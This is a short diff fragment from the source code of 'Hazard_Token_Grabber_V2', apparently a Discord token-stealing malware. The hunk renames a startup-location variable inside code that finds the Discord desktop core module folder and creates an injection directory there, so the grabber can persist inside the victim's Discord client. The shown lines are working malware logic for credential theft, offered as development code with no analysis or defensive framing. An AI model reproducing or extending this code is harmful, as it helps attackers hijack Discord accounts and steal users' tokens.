@@ -201,7 +201,7 @@ class Hazard_Token_Grabber_V2(functions):
                         app = os.path.abspath(disc_sep+__dir)
                         inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                         if os.path.exists(inj_path):
-                            if self.startup not in argv[0]:
+                            if self.startup_loc not in argv[0]:
                                 try:
                                     os.makedirs(
                                         inj_path+'initiation', exist_ok=True)
